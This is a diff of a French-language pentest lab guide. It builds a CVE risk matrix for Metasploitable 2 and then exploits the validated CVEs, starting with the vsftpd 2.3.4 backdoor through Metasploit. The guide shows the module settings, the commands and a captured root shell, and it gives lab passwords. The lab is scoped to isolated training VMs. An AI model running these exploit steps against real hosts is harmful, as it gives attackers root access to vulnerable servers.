+**Prérequis**
 
-Règles de lecture :
-- `certaine` : version exacte dans la plage + exploit public vérifié ;
-- `probable` : version dans la plage mais condition d'accès ou de configuration à confirmer ;
-- `faible` : version hors plage, service non exposé ou configuration bloquante ;
-- `inconnue` : aucune donnée locale permettant de conclure.
+- XML Nmap du Lab-01 ou Lab-02 : `preuves/ch1-lab1/nmap-versions.xml`.
+- `searchsploit` local, sans Internet.
+- Matrice de validation du Lab-02.
+- Versions exactes du Lab-05 : vsftpd `2.3.4`, Samba `3.0.20-Debian`, UnrealIRCd `3.2.8.1`, distccd `v1`, ProFTPD `1.3.1`, MySQL `5.0.51a-3ubuntu5`, PostgreSQL `8.3.1`, Apache `2.2.8`, PHP `5.2.4`, OpenSSL `0.9.8g-4ubuntu3`, noyau `2.6.24-16-server`.
+- Répertoire de travail : `preuves/ch1-lab6/`.
 
-**Explication de la commande** — La table de risque est volontairement simple. `certaine` + `critique` donne `critique`. `probable` + `élevé` donne `élevé`. `faible` + `faible` donne `faible`. `inconnue` donne `inconnu`. Cette règle ne remplace pas une analyse CVSS ; elle donne une priorisation cohérente avec les preuves locales.
+### Outils et commandes utilisées
 
-**Étape 7** — Construire la matrice CSV.
+| Outil | Commande | Rôle |
+|---|---|---|
+| `searchsploit` | `--nmap`, `--cve`, `-p` | Recherche locale et métadonnées |
+| `grep` / `awk` | Extraction des champs CVE et versions | Qualification des candidates |
+| `prouve` | `prouve preuves/ch1-lab6/... commande` | Preuve datée avec code retour |
+| `sha256sum` | `sha256sum -c SHA256SUMS` | Intégrité de la matrice et des preuves |
+
+### Commande et laboratoire étape par étape
+
+#### Étape 1 — Vérifier le XML et le régénérer si nécessaire
+
+**But** — contrôler que le XML Nmap source existe et contient une déclaration XML valide ; le régénérer s'il manque.
+
+**Machine** — Kali `192.168.56.101`.
+
+**Prérequis** — XML du Lab-01 disponible, ou accès à Metasploitable 2 pour le régénérer.
+
+> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
+
+```bash
+ls -l preuves/ch1-lab1/nmap-versions.xml
+head -5 preuves/ch1-lab1/nmap-versions.xml
+prouve preuves/ch1-lab6/nmap-versions.xml bash -c \
+  "echo kali | sudo -S -p '' nmap -sS -n -sV -p 21,22,80,139,445,3306,5432,2121,3632,6667,8180,8009 -oX preuves/ch1-lab6/nmap-versions.xml 192.168.56.103"
+```
+
+**Explication de la commande**
+
+- `ls -l preuves/ch1-lab1/nmap-versions.xml` : vérifie l'existence et la taille du XML.
+- `head -5` : affiche les premières lignes, dont la déclaration XML.
+- `prouve ... nmap-versions.xml` : régénère le XML et l'enregistre dans les preuves du Lab-06.
+- `nmap -sS -n -sV` : scan SYN, sans DNS, avec détection de versions.
+- `-p 21,22,...` : ports utilisés par les services du lab.
+- `-oX preuves/ch1-lab6/nmap-versions.xml` : sortie XML.
+- Piège courant : utiliser un XML tronqué ; `searchsploit --nmap` produit alors des résultats incomplets.
+
+**Résultat attendu**
+
+Le fichier existe et commence par `<?xml version="1.0"?>`.
+
+**Preuve** — `preuves/ch1-lab6/nmap-versions.xml`.
+
+#### Étape 2 — Croiser le XML avec Exploit-DB
+
+**But** — générer une requête par produit détecté et recueillir les candidats, sans les considérer comme validés.
+
+**Machine** — Kali `192.168.56.101`.
+
+**Prérequis** — XML valide de l'étape 1.
+
+> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
+
+```bash
+prouve preuves/ch1-lab6/searchsploit-nmap.txt \
+  searchsploit --disable-colour --nmap preuves/ch1-lab6/nmap-versions.xml
+```
+
+**Explication de la commande**
+
+- `prouve ... searchsploit-nmap.txt` : enregistre la sortie complète et le code retour.
+- `searchsploit` : interroge la base locale.
+- `--disable-colour` : supprime les séquences ANSI.
+- `--nmap preuves/ch1-lab6/nmap-versions.xml` : transforme chaque produit du XML en requête `searchsploit -t`.
+- Le mode XML ignore les termes trop généraux, comme `ftp`.
+- Piège courant : recopier tous les résultats dans la matrice sans comparer les plages de versions ; la sortie est un point de départ.
+
+**Résultat attendu**
+
+Des blocs `searchsploit -t ...` pour chaque produit, avec les résultats correspondants. Le mode XML ne valide pas les plages de versions.
+
+**Preuve** — `preuves/ch1-lab6/searchsploit-nmap.txt`.
+
+#### Étape 3 — Rechercher chaque CVE de la matrice
+
+**But** — vérifier la présence locale de chaque CVE et recenser les exploits associés.
+
+**Machine** — Kali `192.168.56.101`.
+
+**Prérequis** — base Exploit-DB locale ; liste des neuf CVE de la grille de décision.
+
+> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
+
+```bash
+for cve in 2011-2523 2007-2447 2010-2075 2004-2687 2010-4221 2011-3192 2012-1823 2008-0166 2021-4158; do
+  prouve "preuves/ch1-lab6/cve-$cve.txt" \
+    searchsploit --disable-colour --cve "$cve"
+done
+```
+
+**Explication de la commande**
+
+- `for cve in ...; do ... done` : boucle sur les neuf identifiants CVE.
+- `prouve "preuves/ch1-lab6/cve-$cve.txt"` : crée une preuve par CVE.
+- `searchsploit` : interroge la base locale.
+- `--disable-colour` : sortie sans séquences ANSI.
+- `--cve "$cve"` : recherche le code CVE dans les métadonnées.
+- Piège courant : conclure qu'une CVE est absente parce qu'un seul identifiant est recherché ; vérifiez le code complet et la plage de versions.
+
+**Résultat attendu**
+
+```text
+CVE-2011-2523 : 49757.py, 17491.rb
+CVE-2007-2447 : 16320.rb
+CVE-2010-2075 : 16922.rb, 13853.pl
+CVE-2004-2687 : 9915.rb
+CVE-2010-4221 : 16851.rb, 16878.rb
+CVE-2011-3192 : 18221.c, 17696.pl
+CVE-2012-1823 : 29290.c, 29316.py
+CVE-2008-0166 : 5622.txt, 5632.rb
+CVE-2021-4158 : No Results
+```
+
+Les quatre CVE principales ont des résultats locaux. CVE-2010-4221 existe mais concerne une autre plage. CVE-2011-3192 et CVE-2012-1823 sont des CVE web, documentées mais non exécutées. CVE-2008-0166 concerne OpenSSL. CVE-2021-4158 n'a aucun résultat local parce qu'elle ne concerne pas Metasploitable 2 : c'est une vulnérabilité QEMU/ACPI de l'hôte hyperviseur, hors périmètre et interdite à l'exploitation (DoS).
+
+**Preuve** — `preuves/ch1-lab6/cve-2011-2523.txt`, `cve-2007-2447.txt`, `cve-2010-2075.txt`, `cve-2004-2687.txt`, `cve-2010-4221.txt`, `cve-2011-3192.txt`, `cve-2012-1823.txt`, `cve-2008-0166.txt` et `cve-2021-4158.txt`.
+
+#### Étape 4 — Lire les métadonnées des quatre exploits principaux
+
+**But** — confirmer le titre, le chemin local, les codes CVE et l'état de vérification des quatre exploits principaux.
+
+**Machine** — Kali `192.168.56.101`.
+
+**Prérequis** — EDB-ID `16320`, `16922`, `17491` et `9915` identifiés à l'étape 3.
+
+> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
+
+```bash
+for id in 16320 16922 17491 9915; do
+  prouve "preuves/ch1-lab6/edb-$id.txt" searchsploit --disable-colour -p "$id"
+done
+```
+
+**Explication de la commande**
+
+- `for id in ...; do ... done` : boucle sur les quatre identifiants.
+- `prouve "preuves/ch1-lab6/edb-$id.txt"` : crée une preuve par exploit.
+- `searchsploit` : interroge la base locale.
+- `--disable-colour` : sortie sans séquences ANSI.
+- `-p "$id"` : affiche les métadonnées de l'exploit.
+- `Verified: True` : l'exploit a été vérifié par Exploit-DB ; cela ne garantit pas qu'il fonctionne sur cette cible.
+- Piège courant : confondre `Verified: True` avec « exploitable sur cette cible » ; la version et la configuration restent à valider.
+
+**Résultat attendu**
+
+Pour chaque EDB-ID, le titre, l'URL, le chemin local, les codes CVE/OSVDB, `Verified` et le type de fichier.
+
+**Preuve** — `preuves/ch1-lab6/edb-16320.txt`, `edb-16922.txt`, `edb-17491.txt` et `edb-9915.txt`.
+
+#### Étape 5 — Construire la matrice CSV
+
+**But** — produire la matrice de risques à partir de la grille de décision et de la règle de risque, avec une ligne par CVE.
+
+**Machine** — Kali `192.168.56.101`.
+
+**Prérequis** — décisions de la grille de décision ; preuves des étapes 1 à 4.
+
+> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
 
 ```bash
 cat > preuves/ch1-lab6/matrice-risques.csv <<'CSV'
@@ -2470,15 +3758,21 @@ CVE-2008-0166,OpenSSL,0.9.8g-4ubuntu3,22;80;443,validee version,certaine,eleve,e
 CVE-2021-4158,QEMU hote,6.0-6.x,-,hors perimetre,non applicable,non applicable,hors perimetre,Ne pas exposer QEMU hors VirtualBox,Veille fournisseur
 CSV
 head -3 preuves/ch1-lab6/matrice-risques.csv
-```
-
-Résultat attendu : 10 lignes (1 en-tête + 9 risques), 10 colonnes. Vérifiez :
-
-```bash
 awk -F, 'NR>1 {print $8}' preuves/ch1-lab6/matrice-risques.csv | sort | uniq -c
 ```
 
-Résultat attendu :
+**Explication de la commande**
+
+- `cat > preuves/ch1-lab6/matrice-risques.csv <<'CSV'` : écrit le fichier CSV depuis l'entrée standard, sans interprétation des variables.
+- `<<'CSV'` : heredoc avec délimiteur `CSV` ; les guillemets empêchent l'expansion du shell.
+- Les neuf lignes suivantes : une ligne par CVE, avec les colonnes `cve`, `service`, `version`, `port`, `decision`, `probabilite`, `impact`, `risque`, `mitigation` et `detection`.
+- `head -3` : vérifie l'en-tête et les deux premières lignes.
+- `awk -F, 'NR>1 {print $8}'` : extrait la huitième colonne, `risque`.
+- `| sort | uniq -c` : compte les occurrences de chaque niveau de risque.
+- La matrice contient 9 risques : 4 critiques (vsftpd, Samba, UnrealIRCd, distcc), 3 élevés (Apache, PHP, OpenSSL), 1 faible (ProFTPD) et 1 hors périmètre (CVE-2021-4158, QEMU hôte absent de VirtualBox).
+- Piège courant : compter ProFTPD comme critique parce que la CVE existe ; la version n'est pas dans la plage.
+
+**Résultat attendu**
 
 ```text
 4 critique
@@ -2487,19 +3781,49 @@ Résultat attendu :
 1 hors perimetre
 ```
 
-**Explication de la commande** — La matrice contient 9 risques : 4 critiques (vsftpd, Samba, UnrealIRCd, distcc), 3 élevés (Apache, PHP, OpenSSL), 1 faible (ProFTPD) et 1 hors périmètre (CVE-2021-4158, QEMU hôte absent de VirtualBox). Piège courant : compter ProFTPD comme critique parce que la CVE existe ; la version n'est pas dans la plage.
+**Preuve** — `preuves/ch1-lab6/matrice-risques.csv`.
 
-**Étape 8** — Vérifier les décisions de rejet.
+#### Étape 6 — Vérifier les décisions de rejet
+
+**But** — contrôler que les candidats rejetés restent dans la matrice et ne sont pas comptés comme vulnérabilités actives.
+
+**Machine** — Kali `192.168.56.101`.
+
+**Prérequis** — `matrice-risques.csv` construite à l'étape 5.
+
+> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
 
 ```bash
 grep -E 'CVE-2010-4221|CVE-2021-4158' preuves/ch1-lab6/matrice-risques.csv
 ```
 
-Résultat attendu : `rejetee` pour ProFTPD `1.3.1` et `hors perimetre` pour CVE-2021-4158. Ces deux lignes ne doivent pas être comptées comme vulnérabilités actives.
+**Explication de la commande**
 
-**Explication de la commande** — Les décisions de rejet sont explicites. Une ligne `rejetee` n'est pas une vulnérabilité active. Une ligne `non verifiable` n'est pas une absence de vulnérabilité. Les deux doivent rester dans la matrice pour la traçabilité.
+- `grep` : filtre les lignes du fichier.
+- `-E` : active les expressions régulières étendues.
+- `CVE-2010-4221|CVE-2021-4158` : sélectionne les deux lignes de rejet ou hors périmètre.
+- `preuves/ch1-lab6/matrice-risques.csv` : matrice à contrôler.
+- Piège courant : supprimer une ligne rejetée pour « nettoyer » la matrice ; elle doit rester pour la traçabilité.
 
-**Étape 9** — Ajouter la couverture des services.
+**Résultat attendu**
+
+`rejetee` pour ProFTPD `1.3.1` et `hors perimetre` pour CVE-2021-4158. Ces deux lignes ne doivent pas être comptées comme vulnérabilités actives. Une ligne `rejetee` n'est pas une vulnérabilité active ; une ligne `non verifiable` n'est pas une absence de vulnérabilité.
+
+**Preuve** — `preuves/ch1-lab6/matrice-risques.csv`.
+
+#### Étape 7 — Ajouter la couverture des services
+
+**But** — vérifier que chaque service du Lab-05 est relié à une preuve et à une décision dans un fichier de couverture.
+
+**Machine** — Kali `192.168.56.101`.
+
+**Prérequis** — preuves du Lab-05 disponibles ; matrice de l'étape 5.
+
+> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
 
 ```bash
 cat > preuves/ch1-lab6/couverture-services.csv <<'CSV'
@@ -2529,20 +3853,57 @@ CSV
 wc -l preuves/ch1-lab6/couverture-services.csv
 ```
 
-Résultat attendu : 22 lignes (1 en-tête + 21 services). Chaque ligne renvoie à une preuve du Lab-05.
+**Explication de la commande**
 
-**Explication de la commande** — La couverture contient 21 services. Chaque ligne renvoie à une preuve du Lab-05. Si une preuve manque, la ligne est `non verifiable` et le service est marqué comme gap.
+- `cat > ... <<'CSV'` : écrit le fichier de couverture depuis l'entrée standard.
+- `<<'CSV'` : heredoc sans expansion du shell.
+- Les 21 lignes suivantes : un service par ligne, avec `service`, `port`, `outil`, `preuve` et `decision`.
+- `wc -l` : compte les lignes, en-tête compris.
+- Chaque ligne renvoie à une preuve du Lab-05. Si une preuve manque, la ligne est `non verifiable` et le service est marqué comme gap.
+- Piège courant : déclarer un service couvert sans preuve associée ; la ligne doit pointer vers un fichier réel.
 
-**Étape 10** — Geler la matrice.
+**Résultat attendu**
+
+22 lignes (1 en-tête + 21 services).
+
+**Preuve** — `preuves/ch1-lab6/couverture-services.csv`.
+
+#### Étape 8 — Geler la matrice
+
+**But** — calculer les empreintes de la matrice et des preuves, puis vérifier leur intégrité.
+
+**Machine** — Kali `192.168.56.101`.
+
+**Prérequis** — matrice, couverture et preuves des étapes 1 à 7.
+
+> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
 
 ```bash
 sha256sum preuves/ch1-lab6/*.csv preuves/ch1-lab6/*.txt > preuves/ch1-lab6/SHA256SUMS
 sha256sum -c preuves/ch1-lab6/SHA256SUMS
 ```
 
-Résultat attendu : `OK` pour chaque fichier.
+**Explication de la commande**
 
-**Explication de la commande** — `sha256sum -c` vérifie l'intégrité. Le fichier `SHA256SUMS` ne s'inclut pas. Conservez la matrice et les preuves ensemble : une matrice sans preuve n'est pas auditable.
+- `sha256sum` : calcule l'empreinte SHA-256 de chaque fichier listé.
+- `preuves/ch1-lab6/*.csv` : matrices et couverture.
+- `preuves/ch1-lab6/*.txt` : preuves texte.
+- `> preuves/ch1-lab6/SHA256SUMS` : écrit les empreintes.
+- `sha256sum -c` : vérifie chaque fichier contre le fichier de sommes ; `OK` signifie que l'empreinte correspond.
+- Le fichier `SHA256SUMS` ne s'inclut pas lui-même.
+- Piège courant : conserver la matrice sans les preuves ; une matrice sans preuve n'est pas auditable.
+
+**Résultat attendu**
+
+`OK` pour chaque fichier.
+
+**Preuve** — `preuves/ch1-lab6/SHA256SUMS`.
+
+### En conclusion
+
+Vous avez une matrice de 9 risques, 4 critiques, 3 élevés, 1 faible et 1 hors périmètre, avec mitigation et détection. Le chapitre 2 peut commencer : les labs suivants s'appuient sur ce plan gelé et ces preuves.
 
 ```mermaid
 flowchart TB
@@ -2574,9 +3935,7 @@ flowchart TB
 
 **Fig 11.1** — Arbre de décision de la matrice de risques. La version d'abord, l'exploit ensuite, la condition d'accès enfin. Une case « non » ne signifie pas « absent » : elle signifie « non validé avec les preuves locales ».
 
-**Conclusion.** Vous avez une matrice de 9 risques, 4 critiques, 3 élevés, 1 faible et 1 inconnu, avec mitigation et détection. Le chapitre 2 peut commencer : les labs suivants s'appuient sur ce plan gelé et ces preuves.
-
-### 11.5 Matrice de risques attendue
+**Matrice de risques attendue**
 
 | CVE | Service | Version | Décision | Probabilité | Impact | Risque | Mitigation principale |
 |---|---|---|---|---|---|---|---|
@@ -2590,7 +3949,7 @@ flowchart TB
 | CVE-2008-0166 | OpenSSL | 0.9.8g-4ubuntu3 | validée (version) | certaine | élevé | **élevé** | régénérer les clés, mettre à jour |
 | CVE-2021-4158 | QEMU (hôte) | 6.0–6.x | hors périmètre | non applicable | non applicable | **hors périmètre** | ne pas exposer QEMU hors VirtualBox |
 
-### 11.6 Critères de réussite
+**Critères de réussite**
 
 - [ ] Le XML Nmap est présent et lisible.
 - [ ] `searchsploit --nmap` est exécuté et sa limite est notée.
@@ -2604,9 +3963,9 @@ flowchart TB
 - [ ] Tous les exploits sont exécutés dans le lab sans limitation.
 - [ ] La couverture des services contient 21 lignes.
 
-## 12. Lab-07 — Exploitation des CVE validées
+## Lab-07 — Exploitation des CVE validées
 
-### 12.1 Énoncé / Contexte et objectif
+### Énoncé / Contexte
 
 Le Lab-06 a produit une matrice de risques. Quatre CVE sont classées critiques et associées à un module Metasploit vérifié : vsftpd 2.3.4 (CVE-2011-2523), Samba 3.0.20 (CVE-2007-2447), UnrealIRCd 3.2.8.1 (CVE-2010-2075) et distccd v1 (CVE-2004-2687). Ce lab les exécute une par une, dans l'ordre, pour produire une preuve d'accès réelle et documentée.
 
@@ -2618,20 +3977,9 @@ Le Lab-06 a produit une matrice de risques. Quatre CVE sont classées critiques 
 
 > **Périmètre** — Kali `192.168.56.101` vers Metasploitable 2 `192.168.56.103`. Aucune autre cible. Tous les exploits validés sont exécutés sans limitation. Prenez un snapshot `avant-exploitation` avant de commencer et restaurez-le après.
 
-**Ce que ce lab exécute** — toutes les CVE validées sont exploitées sans limitation. Les CVE non exploitables sont qualifiées dans la table 12.9.2 avec une justification. Une CVE non exécutée n'est pas une CVE oubliée : c'est une décision documentée.
+**Ce que ce lab exécute** — toutes les CVE validées sont exploitées sans limitation. Les CVE non exploitables sont qualifiées à l'étape 8 de ce lab avec une justification. Une CVE non exécutée n'est pas une CVE oubliée : c'est une décision documentée.
 
-**Outils et commandes utilisées**
-
-| Outil | Commandes | Rôle |
-|---|---|---|
-| `msfconsole` | `use`, `set`, `exploit -z`, `sessions -l`, `sessions -c`, `sessions -K` | Exploitation des quatre CVE |
-| `prouve` | `prouve msf-*.txt timeout 180 msfconsole -q -r ...` | Preuve horodatée avec code retour |
-| `nc` | `nc -zv 192.168.56.103 21 445 6667 3632 6200` | Vérification des services et du port 6200 |
-| `searchsploit` | `searchsploit --cve CVE-...` | Contrôle de présence des CVE dans Kali |
-| `timeout` | `timeout 180 msfconsole ...` | Borne la durée d'un module |
-| `scp` / `sha256sum` | Archivage et hachage | Intégrité des preuves |
-
-### 12.2 Plan MITRE ATT&CK
+**Plan MITRE ATT&CK**
 
 | Élément | Valeur |
 |---|---|
@@ -2645,7 +3993,7 @@ Le Lab-06 a produit une matrice de risques. Quatre CVE sont classées critiques 
 
 > **Avenant ATT&CK** — T1210 et T1059.004 sont ajoutés au chapitre 1 par l'avenant A.7. Les 24 entrées du plan maître v1.0 restent la référence ; cet avenant documente les deux labs d'exploitation sans réécrire rétroactivement le plan.
 
-### 12.3 Prérequis
+**Prérequis**
 
 - Kali `192.168.56.101`, utilisateur `kali`, mot de passe `kali`.
 - Metasploitable 2 `192.168.56.103`, utilisateur `msfadmin`, mot de passe `msfadmin`.
@@ -2653,11 +4001,32 @@ Le Lab-06 a produit une matrice de risques. Quatre CVE sont classées critiques 
 - Services ouverts sur la cible : `21/tcp` (vsftpd), `445/tcp` (Samba), `6667/tcp` (UnrealIRCd), `3632/tcp` (distccd). Port `6200/tcp` fermé avant le test vsftpd.
 - Outils sur Kali : `msfconsole`, `searchsploit`, `nc`, `timeout`, `grep`, `sha256sum`, `scp`. La fonction `prouve` est chargée avec `source ~/prouve.sh`.
 - Répertoire de travail sur Kali : `~/preuves/ch1-lab7/exploitation`. Répertoire d'archivage sur l'hôte : `preuves/ch1-lab7`.
-- Les quatre fichiers `.rc` et le runner `run-cve.sh` fournis en 12.4. Si vous les recréez, conservez exactement les mêmes adresses, ports et payloads.
+- Les quatre fichiers `.rc` et le runner `run-cve.sh` fournis à l'étape 2 de ce lab. Si vous les recréez, conservez exactement les mêmes adresses, ports et payloads.
 
-Vérifiez l'état de départ avant toute exploitation :
+### Outils et commandes utilisées
+
+| Outil | Commande | Rôle |
+|---|---|---|
+| `msfconsole` | `use`, `set`, `exploit -z`, `sessions -l`, `sessions -c`, `sessions -K` | Exploitation des quatre CVE |
+| `prouve` | `prouve msf-*.txt timeout 180 msfconsole -q -r ...` | Preuve horodatée avec code retour |
+| `nc` | `nc -zv 192.168.56.103 21 445 6667 3632 6200` | Vérification des services et du port 6200 |
+| `searchsploit` | `searchsploit --cve CVE-...` | Contrôle de présence des CVE dans Kali |
+| `timeout` | `timeout 180 msfconsole ...` | Borne la durée d'un module |
+| `scp` / `sha256sum` | Archivage et hachage | Intégrité des preuves |
+
+### Commande et laboratoire étape par étape
+
+#### Étape 1 — Vérifier l'état de départ
+
+**But** — confirmer la joignabilité de la cible, l'ouverture des quatre services et la disponibilité des ports d'écoute avant toute exploitation.
+
+**Machine** — Kali `192.168.56.101` vers Metasploitable 2 `192.168.56.103`.
+
+**Prérequis** — snapshot `avant-exploitation` pris ; VM démarrée ; fonction `prouve` disponible.
 
 > **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
 
 ```bash
 source ~/prouve.sh
@@ -2665,7 +4034,20 @@ prouve preuves/ch1-lab7/exploitation/00-prerequis.txt bash -c \
   'ping -c 2 192.168.56.103; for p in 21 445 6667 3632; do nc -zv 192.168.56.103 "$p"; done; ss -lntp | grep -E ":4446|:4447|:4448" || true'
 ```
 
-Résultat attendu :
+**Explication de la commande**
+
+- `source ~/prouve.sh` : charge la fonction `prouve` dans le shell courant.
+- `prouve ... 00-prerequis.txt` : enregistre le contrôle complet et son code retour.
+- `bash -c '...'` : exécute la séquence dans un shell enfant.
+- `ping -c 2 192.168.56.103` : envoie deux paquets ICMP pour confirmer la route host-only.
+- `for p in 21 445 6667 3632; do ... done` : boucle sur les quatre ports des services.
+- `nc -zv 192.168.56.103 "$p"` : teste l'ouverture du port sans envoyer de données.
+- `ss -lntp` : liste les sockets TCP en écoute avec les processus.
+- `grep -E ":4446|:4447|:4448"` : vérifie qu'aucun listener local n'occupe les LPORT des modules.
+- `|| true` : empêche l'échec du `grep` d'interrompre la preuve.
+- Piège courant : lancer un module avec un LPORT déjà occupé ; le handler reverse ne démarre pas.
+
+**Résultat attendu**
 
 ```text
 2 packets transmitted, 2 received, 0% packet loss, time 1006ms
@@ -2681,21 +4063,35 @@ rtt min/avg/max/mdev = 0.374/0.419/0.465/0.045 ms
 # rc=0
 ```
 
-**Explication de la commande** — `ping` confirme la route host-only ; `nc -zv` confirme que les quatre services sont joignables ; `ss -lntp` vérifie qu'aucun listener local Kali n'occupe déjà `4446`, `4447` ou `4448`. Sans cette vérification, Metasploit peut échouer au démarrage du handler reverse.
+Si `nc` retourne `Connection refused`, ne lancez pas l'exploit : vérifiez la VM, le service et le snapshot. Si `ss` montre un LPORT occupé, changez le LPORT dans le `.rc` et dans le tableau de bord, pas au hasard pendant l'exécution.
 
-**Piège courant** — si `nc` retourne `Connection refused` sur un service, ne lancez pas l'exploit : vérifiez que la VM est démarrée, que le service est actif et que le snapshot restauré est bien `avant-exploitation`. Si `ss` montre un LPORT occupé, changez le LPORT dans le `.rc` et dans le tableau de bord, pas au hasard pendant l'exécution.
+**Preuve** — `preuves/ch1-lab7/exploitation/00-prerequis.txt`.
 
-### 12.4 Préparation des scripts
+#### Étape 2 — Préparer les scripts
 
-Créez le répertoire de travail et placez-y les scripts suivants. Chaque script est complet : il ne contient aucun placeholder et utilise les adresses du laboratoire.
+**But** — créer le répertoire de travail, les quatre scripts Metasploit et le runner, puis vérifier leur présence et leur intégrité.
+
+**Machine** — Kali `192.168.56.101`.
+
+**Prérequis** — état de départ vérifié à l'étape 1 ; `msfconsole` installé.
 
 > **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
 
 ```bash
 mkdir -p ~/preuves/ch1-lab7/exploitation
 cd ~/preuves/ch1-lab7/exploitation
 pwd
 ```
+
+**Explication de la commande**
+
+- `mkdir -p ~/preuves/ch1-lab7/exploitation` : crée le répertoire de travail et ses parents.
+- `cd ~/preuves/ch1-lab7/exploitation` : place le shell dans ce répertoire.
+- `pwd` : affiche le chemin courant pour vérifier la localisation.
+
+Créez ensuite les quatre fichiers `.rc` suivants. Chaque script est complet : il ne contient aucun placeholder et utilise les adresses du laboratoire.
 
 **`vsftpd.rc`** — backdoor vsftpd, cible `192.168.56.103:21`, shell sur `6200/tcp`.
 
@@ -2809,23 +4205,63 @@ ls -l vsftpd.rc samba.rc unreal.rc distcc.rc run-cve.sh
 sha256sum vsftpd.rc samba.rc unreal.rc distcc.rc run-cve.sh | tee SHA256SUMS
 ```
 
-Résultat attendu : cinq fichiers listés, cinq empreintes SHA-256, puis `# rc=` visible dans chaque preuve d'exploitation. Les scripts ne contiennent ni `check` pour vsftpd, ni commande de persistance, ni commande de déni de service.
+**Explication du runner**
 
-### 12.5 Étape 1 — vsftpd 2.3.4 (CVE-2011-2523)
+- `set -u` : interdit l'utilisation d'une variable non définie.
+- `source /home/kali/prouve.sh` : recharge `prouve` pour un shell non interactif.
+- `BASE=/home/kali/preuves/ch1-lab7/exploitation` : fixe le répertoire unique des scripts et des preuves.
+- `for cve in vsftpd samba unreal distcc; do ... done` : exécute les quatre modules dans l'ordre.
+- `prouve "$BASE/msf-$cve.txt" timeout 180 msfconsole -q -r "$BASE/$cve.rc"` : enregistre chaque exécution et borne chaque module à 180 secondes.
+- `|| true` : empêche un échec de module d'arrêter les suivants.
+- Le second `for` et `grep -H '^# rc='` : affichent le code retour de chaque preuve.
+- `sha256sum ... | tee SHA256SUMS` : calcule et affiche les empreintes tout en les enregistrant.
+- Piège courant : modifier un `.rc` après le calcul des empreintes ; le hash ne correspond plus.
 
-**But** — déclencher la backdoor du binaire vsftpd 2.3.4 et obtenir un shell root sur le port `6200/tcp`.
+**Résultat attendu**
+
+Cinq fichiers listés, cinq empreintes SHA-256, puis `# rc=` visible dans chaque preuve d'exploitation. Les scripts ne contiennent ni `check` pour vsftpd, ni commande de persistance, ni commande de déni de service.
+
+**Preuve** — `preuves/ch1-lab7/exploitation/vsftpd.rc`, `samba.rc`, `unreal.rc`, `distcc.rc`, `run-cve.sh` et `SHA256SUMS`.
+
+#### Étape 3 — vsftpd 2.3.4 (CVE-2011-2523)
+
+**But** — déclencher la backdoor du binaire vsftpd 2.3.4, obtenir un shell root sur le port `6200/tcp`, puis vérifier la fermeture du port.
 
 **Machine** — Kali `192.168.56.101` vers Metasploitable 2 `192.168.56.103`.
 
-**Prérequis** — port `21/tcp` ouvert, port `6200/tcp` fermé, snapshot `avant-exploitation` pris.
+**Prérequis** — port `21/tcp` ouvert, port `6200/tcp` fermé, snapshot `avant-exploitation` pris, scripts de l'étape 2 présents.
 
 > **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali/preuves/ch1-lab7/exploitation`
 
+**Exemple de commande**
+
 ```bash
 prouve msf-vsftpd.txt timeout 180 msfconsole -q -r vsftpd.rc
+prouve msf-vsftpd-port6200.txt bash -c 'nc -zv 192.168.56.103 6200'
 ```
 
-Résultat attendu (extrait réel) :
+**Explication de la commande**
+
+- `prouve msf-vsftpd.txt` : enregistre la session Metasploit et le code retour.
+- `timeout 180` : borne l'exécution à 180 secondes.
+- `msfconsole -q` : lance Metasploit en mode silencieux.
+- `-r vsftpd.rc` : exécute le script de ressources vsftpd.
+- `use exploit/unix/ftp/vsftpd_234_backdoor` : charge le module dédié à la backdoor vsftpd 2.3.4.
+- `set RHOSTS 192.168.56.103` : fixe l'adresse de Metasploitable 2.
+- `set RPORT 21` : fixe le port FTP, qui déclenche la backdoor.
+- `set TARGET 1` : sélectionne `Backdoor Command Shell`, avec un shell sur `6200/tcp`.
+- `show options` : affiche les options réellement prises en compte.
+- `exploit -z` : lance l'exploit et met la session en arrière-plan après ouverture.
+- `sleep 8` : laisse à la backdoor le temps d'ouvrir `6200/tcp`.
+- `sessions -l` : inventorie la session et affiche le couple source/destination.
+- `sessions -c "id; hostname; uname -a"` : exécute trois commandes courtes et non destructives pour identifier le contexte.
+- `sessions -K` : ferme la session ; aucune persistance n'est laissée.
+- `exit -y` : quitte `msfconsole` sans confirmation interactive.
+- `prouve msf-vsftpd-port6200.txt bash -c 'nc -zv ...'` : exécute le contrôle de fermeture et l'enregistre.
+- `nc -zv 192.168.56.103 6200` : teste le port `6200/tcp` sans envoyer de données.
+- Piège courant : ajouter `check` avant `exploit -z`. Le module exécute déjà son auto-check ; un `check` explicite peut déclencher la backdoor, laisser `6200/tcp` ouvert, puis provoquer l'échec.
+
+**Résultat attendu**
 
 ```text
 [*] 192.168.56.103:21 - FTP banner hints its vulnerable: 220 (vsFTPd 2.3.4)
@@ -2836,58 +4272,51 @@ uid=0(root) gid=0(root)
 metasploitable
 Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
 # rc=0
